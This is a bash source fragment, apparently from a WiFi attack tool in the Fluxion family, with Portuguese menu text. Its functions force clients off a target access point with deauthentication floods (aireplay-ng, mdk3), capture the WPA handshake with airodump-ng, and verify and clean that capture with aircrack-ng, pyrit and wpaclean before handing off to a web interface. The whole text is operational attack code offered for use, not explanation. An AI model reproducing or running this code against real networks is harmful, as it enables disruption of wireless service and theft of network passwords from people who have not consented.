function deauth() {
    conditional_clear
    iwconfig "$WIFI_MONITOR" channel "$Host_CHAN"

    case $1 in
        all)
            DEAUTH=deauthall
            capture & $DEAUTH
            CSVDB=$Host_MAC-01.csv
            ;;
        mdk3)
            DEAUTH=deauthmdk3
            capture & $DEAUTH &
            CSVDB=$Host_MAC-01.csv
            ;;
        esp)
            DEAUTH=deauthesp
            HOST=$(grep -a "$Host_MAC" "$DUMP_PATH/$CSVDB" | awk '{print $1}' | grep -av '00:00:00:00' | grep -v "$Host_MAC" || true)
            LINEAS_CLIENTES=$(echo "$HOST" | wc -m)
            if [ "$LINEAS_CLIENTES" -le 5 ]; then
                DEAUTH=deauthall
                capture & $DEAUTH
                CSVDB=$Host_MAC-01.csv
            fi
            capture
            for CLIENT in $HOST; do
                Client_MAC=${CLIENT:0:17}
                deauthesp
            done
            $DEAUTH
            CSVDB=$Host_MAC-01.csv
            ;;
    esac

    deauthMENU
}

function deauthMENU() {
    while true; do
        conditional_clear; clear; top
        echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthMENU"
        echo; echo -e "Status handshake: $Handshake_statuscheck"; echo
        echo -e "      ${red}[${yellow}1${red}]${transparent} $deauthMENU_option_1"
        echo -e "      ${red}[${yellow}2${red}]${transparent} $general_back"
        echo -e "      ${red}[${yellow}3${red}]${transparent} Selecionar outra rede"
        echo -e "      ${red}[${yellow}4${red}]${transparent} Sair"
        echo -n '      #> '
        read -r yn
        case $yn in
            1) checkhandshake ;;
            2) conditional_clear; killall xterm &>"$flux_output_device"; askclientsel; break ;;
            3) killall airodump-ng mdk3 aireplay-ng xterm &>"$flux_output_device"; CSVDB=dump-01.csv; killall xterm &>"$flux_output_device"; selection; break ;;
            4) exitmode; break ;;
            *) echo "$general_case_error"; conditional_clear ;;
        esac
    done
}

function capture() {
    conditional_clear
    if ! pgrep -x airodump-ng &>/dev/null; then
        rm -rf "${DUMP_PATH:?}/$Host_MAC"*
        xterm $HOLD -title "Capturando canal $Host_CHAN" $TOPRIGHT \
            -bg "#000000" -fg "#FFFFFF" \
            -e airodump-ng --ignore-negative-one --bssid "$Host_MAC" \
               -w "$DUMP_PATH/$Host_MAC" -c "$Host_CHAN" -a "$WIFI_MONITOR" &
    fi
}

function checkhandshake() {
    if [ "$handshakemode" = "normal" ]; then
        if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
            wpaclean "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" "$DUMP_PATH/$Host_MAC-01.cap" &>"$flux_output_device"
            webinterface
        else
            Handshake_statuscheck="${red}Não Encontrado${transparent}"
        fi
    elif [ "$handshakemode" = "hard" ]; then
        pyrit -r "$DUMP_PATH/$Host_MAC-01.cap" -o "$DUMP_PATH/test.cap" stripLive &>"$flux_output_device"
        if pyrit -r "$DUMP_PATH/test.cap" analyze 2>&1 | grep -q "good,"; then
            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
            pyrit -r "$DUMP_PATH/test.cap" -o "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" strip &>"$flux_output_device"
            webinterface
        else
            if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
                Handshake_statuscheck="${yellow}Corrompido${transparent}"
            else
                Handshake_statuscheck="${red}Não Encontrado${transparent}"
            fi
        fi
        rm -f "$DUMP_PATH/test.cap" &>"$flux_output_device"
    fi
}

